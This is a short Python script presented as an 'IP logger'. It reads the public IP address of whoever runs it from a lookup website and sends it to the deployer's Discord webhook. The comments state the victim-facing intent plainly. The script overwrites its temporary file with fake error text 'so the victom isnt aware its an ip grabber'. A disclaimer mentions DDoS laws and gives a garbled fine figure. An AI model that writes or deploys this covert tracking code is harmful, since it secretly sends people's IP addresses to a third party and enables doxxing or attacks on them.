# IP LOGGER MADE BY: Buttxrz BRUH#0420 
# IF YOU USE THIS CODE YOU ARE AGREEING THAT ANYTHING YOU DO WITH IT IS ON YOU 
# DDOSing is completely illegal as defined by the Computer Fraud and Abuse Act and cybercriminals may face imprisonment charges of a five million dollars ($5,00,000) Fine and ten years of jail.
import requests # pip install requests
from discord_webhook import DiscordWebhook # pip install discord_webhook

ip = "idk" # I put idk just so there is string called ip it will be changed later

r = requests.get("https://whatismyipaddress.com/") # gets the page whatsmyipaddress
f = open("errorlog.txt", "w") #  creates a file called errorlog.txt in write mode if it doesn't already exist
f.write(r.text) # writes info from the page to the document
f.close() # closes
reader = open("errorlog.txt", "r") # opens it back up but in read mode so it can read it
for line in reader: # checks every line for "<li>Your IP address: "
	if """<li>Your IP address:""" in line:  
		ip = line # updates ip to the line
		DiscordWebhook( # Send the ip to your discord server
		                url = f"enter in your discord webhook url here",
		                content = ip 
		            ).execute()

reader.close() # closes the document again
er = open("errorlog.txt", "w") # opens it back up in write mode
er.write("""[[]:Errors:  [0]:[]:Status: Ok[200]:]""") # writes some stupid stuff to the document so the victom isnt aware its an ip grabber
er.close() # close